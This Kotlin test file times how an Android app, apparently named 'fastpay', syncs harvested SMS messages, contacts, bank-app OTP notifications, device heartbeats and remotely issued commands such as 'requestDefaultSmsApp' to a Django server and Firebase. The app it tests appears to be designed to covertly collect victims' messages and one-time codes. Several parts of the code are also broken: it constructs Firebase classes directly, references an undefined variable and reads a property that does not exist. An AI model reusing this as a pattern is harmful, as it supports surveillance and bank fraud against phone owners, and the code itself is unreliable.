package com.example.fast.integration

import com.example.fast.util.DjangoApiHelper
import com.example.fast.util.FirebaseSyncHelper
import com.example.fast.util.FirebaseWriteHelper
import com.example.fast.model.ChatMessage
import com.example.fast.model.Contact
import com.google.common.truth.Truth.assertThat
import io.mockk.every
import io.mockk.mockk
import io.mockk.mockkObject
import io.mockk.mockkStatic
import io.mockk.unmockkAll
import kotlinx.coroutines.delay
import kotlinx.coroutines.test.runTest
import okhttp3.mockwebserver.MockResponse
import okhttp3.mockwebserver.MockWebServer
import org.junit.After
import org.junit.Before
import org.junit.Test
import java.util.concurrent.TimeUnit
import kotlin.math.abs

/**
 * Integration tests for Django-Firebase-APK synchronization timing
 *
 * Tests verify that data synchronization between Django API and Firebase
 * database occurs within acceptable time limits with timestamp consistency.
 */
class SyncTimingTest {

    private lateinit var mockWebServer: MockWebServer
    private lateinit var mockFirebaseDatabase: com.google.firebase.database.DatabaseReference
    private lateinit var mockReference: com.google.firebase.database.DatabaseReference
    private lateinit var mockTask: com.google.android.gms.tasks.Task<Void>
    
    private val deviceId = "test_device_123"
    private val maxMessageSyncTime = 5000L // 5 seconds
    private val maxCommandExecutionTime = 2000L // 2 seconds
    private val maxHeartbeatDeviation = 10000L // ±10 seconds

    @Before
    fun setUp() {
        // Setup MockWebServer for Django API
        mockWebServer = MockWebServer()
        mockWebServer.start()

        // Setup Firebase mocks
        mockFirebaseDatabase = com.google.firebase.database.DatabaseReference()
        mockReference = com.google.firebase.database.DatabaseReference()
        mockTask = com.google.android.gms.tasks.Task()

        // Mock static methods
        mockkStatic(Firebase::class)
        mockkObject(DjangoApiHelper)
        mockkStatic(LogHelper::class)
        mockkObject(SmsQueryHelper)

        // Setup mock behavior
        every { Firebase.database } returns mockFirebaseDatabase
        every { mockFirebaseDatabase.reference } returns mockReference
        every { mockReference.child(any()) } returns mockReference
        every { mockReference.setValue(any()) } returns mockTask
        every { mockReference.updateChildren(any()) } returns mockTask
        every { mockTask.addOnSuccessListener(any()) } returns mockTask
        every { mockTask.addOnFailureListener(any()) } returns mockTask
        every { mockTask.result } returns null
        every { mockTask.isComplete } returns true
        every { mockTask.isSuccessful } returns true

        // Mock logging
        every { LogHelper.d(any(), any()) } returns 0
        every { LogHelper.e(any(), any()) } returns 0
        every { LogHelper.e(any(), any(), any()) } returns 0

        // Mock SMS query
        every { SmsQueryHelper.getAllMessages(any(), any()) } returns listOf()
    }

    @After
    fun tearDown() {
        mockWebServer.shutdown()
        unmockkAll()
    }

    @Test
    fun `test message sync timing - Django and Firebase within 5 seconds`() = runTest {
        // Setup Django API mock
        mockWebServer.enqueue(
            MockResponse()
                .setResponseCode(201)
                .setBody("""{"status":"created"}""")
        )

        // Create test message
        val testMessage = ChatMessage().apply {
            address = "+1234567890"
            body = "Test message for timing"
            timestamp = System.currentTimeMillis()
            isReceived = true
            isRead = false
        }

        val startTime = System.currentTimeMillis()

        // Sync to Firebase
        var firebaseSyncTime: Long? = null
        FirebaseSyncHelper.syncSmsMessages(
            context = mockk(),
            messages = listOf(testMessage),
            onSuccess = { count ->
                firebaseSyncTime = System.currentTimeMillis() - startTime
            },
            onFailure = { error ->
                throw AssertionError("Firebase sync failed: $error")
            }
        )

        // Sync to Django
        var djangoSyncTime: Long? = null
        DjangoApiHelper.syncMessages(deviceId, listOf(mapOf(
            "message_type" to "received",
            "phone" to testMessage.address,
            "body" to testMessage.body,
            "timestamp" to testMessage.timestamp,
            "read" to testMessage.isRead
        )))

        djangoSyncTime = System.currentTimeMillis() - startTime

        // Wait for async operations to complete
        delay(100)

        // Verify timing requirements
        assertThat(firebaseSyncTime).isNotNull()
        assertThat(djangoSyncTime).isNotNull()
        assertThat(firebaseSyncTime!!).isLessThan(maxMessageSyncTime)
        assertThat(djangoSyncTime!!).isLessThan(maxMessageSyncTime)

        // Verify Django API was called
        val request = mockWebServer.takeRequest(5, TimeUnit.SECONDS)
        assertThat(request).isNotNull()
        assertThat(request!!.method).isEqualTo("POST")
        assertThat(request.path).isEqualTo("/messages/")
    }

    @Test
    fun `test command execution timing - Firebase trigger to Django logging within 2 seconds`() = runTest {
        // Setup Django API mock for command logging
        mockWebServer.enqueue(
            MockResponse()
                .setResponseCode(201)
                .setBody("""{"status":"logged"}""")
        )

        val startTime = System.currentTimeMillis()
        val commandTimestamp = startTime

        // Simulate Firebase command trigger
        val commandData = mapOf(
            "command" to "requestDefaultSmsApp",
            "value" to "true",
            "status" to "pending"
        )

        // Write command to Firebase
        FirebaseWriteHelper.setValue(
            path = "commands/$deviceId/$commandTimestamp",
            data = commandData
        )

        // Simulate command execution and Django logging
        val executionTime = System.currentTimeMillis()
        DjangoApiHelper.logCommand(
            deviceId = deviceId,
            command = "requestDefaultSmsApp",
            value = "true",
            status = "executed",
            receivedAt = commandTimestamp,
            executedAt = executionTime,
            errorMessage = "request_ui_launched"
        )

        val totalExecutionTime = System.currentTimeMillis() - startTime

        // Verify timing requirement
        assertThat(totalExecutionTime).isLessThan(maxCommandExecutionTime)

        // Verify Django API was called
        val request = mockWebServer.takeRequest(5, TimeUnit.SECONDS)
        assertThat(request).isNotNull()
        assertThat(request!!.method).isEqualTo("POST")
        assertThat(request.path).isEqualTo("/command-logs/")
    }

    @Test
    fun `test heartbeat consistency across Django and Firebase`() = runTest {
        // Setup Django API mock
        mockWebServer.enqueue(
            MockResponse()
                .setResponseCode(200)
                .setBody("""{"device_id":"$deviceId","last_seen":$timestamp}""")
        )

        val heartbeatTimestamp = System.currentTimeMillis()
        val batteryPercentage = 85

        // Write heartbeat to Firebase
        FirebaseWriteHelper.writeHeartbeat(
            deviceId = deviceId,
            timestamp = heartbeatTimestamp,
            batteryPercentage = batteryPercentage,
            lastBatteryPercentage = 84,
            shouldUpdateMain = true
        )

        // Update device in Django
        DjangoApiHelper.patchDevice(deviceId, mapOf(
            "last_seen" to heartbeatTimestamp,
            "battery_percentage" to batteryPercentage
        ))

        // Get device data from Django
        val djangoDevice = DjangoApiHelper.getDevice(deviceId)

        // Verify timestamp consistency
        assertThat(djangoDevice).isNotNull()
        val djangoLastSeen = djangoDevice!!["last_seen"] as? Double
        assertThat(djangoLastSeen).isNotNull()
        assertThat(abs(djangoLastSeen!!.toLong() - heartbeatTimestamp)).isLessThan(maxHeartbeatDeviation)

        // Verify battery percentage consistency
        val djangoBattery = djangoDevice["battery_percentage"] as? Double
        assertThat(djangoBattery).isEqualTo(batteryPercentage.toDouble())
    }

    @Test
    fun `test contact sync timing and format consistency`() = runTest {
        // Setup Django API mock
        mockWebServer.enqueue(
            MockResponse()
                .setResponseCode(201)
                .setBody("""{"status":"created"}""")
        )

        val startTime = System.currentTimeMillis()

        // Create test contact
        val testContact = Contact().apply {
            id = "contact_123"
            name = "John Doe"
            phoneNumber = "+1234567890"
            company = "ACME Inc"
            lastContacted = startTime
        }

        // Sync to Firebase
        var firebaseSyncTime: Long? = null
        FirebaseSyncHelper.syncCompleteContacts(
            context = mockk(),
            contacts = listOf(testContact),
            onSuccess = { count ->
                firebaseSyncTime = System.currentTimeMillis() - startTime
            },
            onFailure = { error ->
                throw AssertionError("Firebase sync failed: $error")
            }
        )

        // Sync to Django
        var djangoSyncTime: Long? = null
        DjangoApiHelper.syncContacts(deviceId, listOf(mapOf(
            "name" to testContact.name,
            "phone_number" to testContact.phoneNumber,
            "company" to testContact.company,
            "last_contacted" to testContact.lastContacted
        )))

        djangoSyncTime = System.currentTimeMillis() - startTime

        // Wait for async operations
        delay(100)

        // Verify timing requirements
        assertThat(firebaseSyncTime).isNotNull()
        assertThat(djangoSyncTime).isNotNull()
        assertThat(firebaseSyncTime!!).isLessThan(maxMessageSyncTime)
        assertThat(djangoSyncTime!!).isLessThan(maxMessageSyncTime)

        // Verify Django API was called
        val request = mockWebServer.takeRequest(5, TimeUnit.SECONDS)
        assertThat(request).isNotNull()
        assertThat(request!!.method).isEqualTo("POST")
        assertThat(request.path).isEqualTo("/contacts/")
    }

    @Test
    fun `test notification sync timing`() = runTest {
        // Setup Django API mock
        mockWebServer.enqueue(
            MockResponse()
                .setResponseCode(201)
                .setBody("""{"status":"created"}""")
        )

        val startTime = System.currentTimeMillis()

        // Create test notification
        val notificationData = mapOf(
            "package_name" to "com.bank.app",
            "title" to "OTP Received",
            "text" to "Your OTP is 123456",
            "timestamp" to startTime
        )

        // Sync to Django
        DjangoApiHelper.syncNotifications(deviceId, listOf(notificationData))

        val syncTime = System.currentTimeMillis() - startTime

        // Verify timing requirement
        assertThat(syncTime).isLessThan(maxMessageSyncTime)

        // Verify Django API was called
        val request = mockWebServer.takeRequest(5, TimeUnit.SECONDS)
        assertThat(request).isNotNull()
        assertThat(request!!.method).isEqualTo("POST")
        assertThat(request.path).isEqualTo("/notifications/")
    }

    @Test
    fun `test device registration timing and consistency`() = runTest {
        // Setup Django API mock
        mockWebServer.enqueue(
            MockResponse()
                .setResponseCode(201)
                .setBody("""{"device_id":"$deviceId","status":"created"}""")
        )

        val startTime = System.currentTimeMillis()

        // Register device with Django
        val deviceData = mapOf(
            "currentPhone" to "+1234567890",
            "code" to "ABCD1234",
            "isActive" to true,
            "time" to startTime,
            "batteryPercentage" to 85,
            "currentIdentifier" to "SIM_1",
            "bankcard" to "VISA"
        )

        DjangoApiHelper.registerDevice(deviceId, deviceData)

        // Also write to Firebase for consistency
        FirebaseWriteHelper.setValue(
            path = "fastpay/$deviceId",
            data = deviceData.toMutableMap().apply {
                put("device_id", deviceId)
                put("last_seen", startTime)
            }
        )

        val registrationTime = System.currentTimeMillis() - startTime

        // Verify timing requirement
        assertThat(registrationTime).isLessThan(maxMessageSyncTime)

        // Verify Django API was called
        val request = mockWebServer.takeRequest(5, TimeUnit.SECONDS)
        assertThat(request).isNotNull()
        assertThat(request!!.method).isEqualTo("POST")
        assertThat(request.path).isEqualTo("/devices/")
    }

    @Test
    fun `test timestamp consistency across multiple operations`() = runTest {
        val baseTimestamp = System.currentTimeMillis()

        // Setup Django API mocks
        mockWebServer.enqueue(MockResponse().setResponseCode(201).setBody("""{"status":"created"}"""))
        mockWebServer.enqueue(MockResponse().setResponseCode(201).setBody("""{"status":"created"}"""))
        mockWebServer.enqueue(MockResponse().setResponseCode(201).setBody("""{"status":"created"}"""))

        // Perform multiple operations with timestamps
        val messageTimestamp = baseTimestamp
        val contactTimestamp = baseTimestamp + 1000
        val heartbeatTimestamp = baseTimestamp + 2000

        // Sync message
        DjangoApiHelper.syncMessages(deviceId, listOf(mapOf(
            "timestamp" to messageTimestamp,
            "phone" to "+1234567890",
            "body" to "Test message",
            "message_type" to "received"
        )))

        // Sync contact
        DjangoApiHelper.syncContacts(deviceId, listOf(mapOf(
            "last_contacted" to contactTimestamp,
            "phone_number" to "+0987654321",
            "name" to "Test Contact"
        )))

        // Update heartbeat
        DjangoApiHelper.patchDevice(deviceId, mapOf(
            "last_seen" to heartbeatTimestamp,
            "battery_percentage" to 85
        ))

        // Verify all requests were made with correct timestamps
        val messageRequest = mockWebServer.takeRequest(5, TimeUnit.SECONDS)
        val contactRequest = mockWebServer.takeRequest(5, TimeUnit.SECONDS)
        val heartbeatRequest = mockWebServer.takeRequest(5, TimeUnit.SECONDS)

        assertThat(messageRequest).isNotNull()
        assertThat(contactRequest).isNotNull()
        assertThat(heartbeatRequest).isNotNull()

        // Verify timestamp ordering and consistency
        assertThat(messageTimestamp).isLessThan(contactTimestamp)
        assertThat(contactTimestamp).isLessThan(heartbeatTimestamp)

        // Verify all timestamps are within acceptable range
        val currentTime = System.currentTimeMillis()
        assertThat(abs(currentTime - heartbeatTimestamp)).isLessThan(maxHeartbeatDeviation)
    }

    @Test
    fun `test concurrent sync operations timing`() = runTest {
        // Setup Django API mock for multiple requests
        repeat(5) {
            mockWebServer.enqueue(MockResponse().setResponseCode(201).setBody("""{"status":"created"}"""))
        }

        val startTime = System.currentTimeMillis()

        // Perform multiple sync operations concurrently
        val operations = listOf(
            // Sync messages
            {
                DjangoApiHelper.syncMessages(deviceId, listOf(mapOf(
                    "timestamp" to startTime,
                    "phone" to "+1234567890",
                    "body" to "Message 1",
                    "message_type" to "received"
                )))
            },
            // Sync contacts
            {
                DjangoApiHelper.syncContacts(deviceId, listOf(mapOf(
                    "phone_number" to "+0987654321",
                    "name" to "Contact 1"
                )))
            },
            // Sync notifications
            {
                DjangoApiHelper.syncNotifications(deviceId, listOf(mapOf(
                    "package_name" to "com.test.app",
                    "title" to "Test Notification",
                    "text" to "Test content",
                    "timestamp" to startTime
                )))
            },
            // Log command
            {
                DjangoApiHelper.logCommand(
                    deviceId = deviceId,
                    command = "testCommand",
                    value = "testValue",
                    status = "executed",
                    receivedAt = startTime,
                    executedAt = startTime + 500
                )
            },
            // Update device
            {
                DjangoApiHelper.patchDevice(deviceId, mapOf(
                    "last_seen" to startTime,
                    "battery_percentage" to 85
                ))
            }
        )

        // Execute all operations
        operations.forEach { it() }

        val totalTime = System.currentTimeMillis() - startTime

        // Verify concurrent operations complete within reasonable time
        assertThat(totalTime).isLessThan(maxMessageSyncTime * 2) // Allow 2x for concurrent operations

        // Verify all requests were made
        repeat(5) {
            val request = mockWebServer.takeRequest(5, TimeUnit.SECONDS)
            assertThat(request).isNotNull()
        }
    }

    @Test
    fun `test sync failure recovery timing`() = runTest {
        // Setup Django API mock with failure then success
        mockWebServer.enqueue(
            MockResponse()
                .setResponseCode(500)
                .setBody("""{"error":"Internal Server Error"}""")
        )
        mockWebServer.enqueue(
            MockResponse()
                .setResponseCode(201)
                .setBody("""{"status":"created"}""")
        )

        val startTime = System.currentTimeMillis()

        // Attempt sync that will fail and retry
        try {
            DjangoApiHelper.syncMessages(deviceId, listOf(mapOf(
                "timestamp" to startTime,
                "phone" to "+1234567890",
                "body" to "Test message",
                "message_type" to "received"
            )))
        } catch (e: Exception) {
            // Expected to fail on first attempt
        }

        // Wait for retry delay (simulated)
        delay(100)

        // Try again (this would be handled by retry logic in production)
        val retryTime = System.currentTimeMillis()
        DjangoApiHelper.syncMessages(deviceId, listOf(mapOf(
            "timestamp" to retryTime,
            "phone" to "+1234567890",
            "body" to "Test message retry",
            "message_type" to "received"
        )))

        val totalTime = System.currentTimeMillis() - startTime

        // Verify recovery timing is reasonable
        assertThat(totalTime).isLessThan(maxMessageSyncTime * 3) // Allow 3x for retry

        // Verify both attempts were made
        val firstRequest = mockWebServer.takeRequest(5, TimeUnit.SECONDS)
        val retryRequest = mockWebServer.takeRequest(5, TimeUnit.SECONDS)
        
        assertThat(firstRequest).isNotNull()
        assertThat(retryRequest).isNotNull()
        assertThat(firstRequest!!.code).isEqualTo(500)
        assertThat(retryRequest!!.code).isEqualTo(201)
    }
}
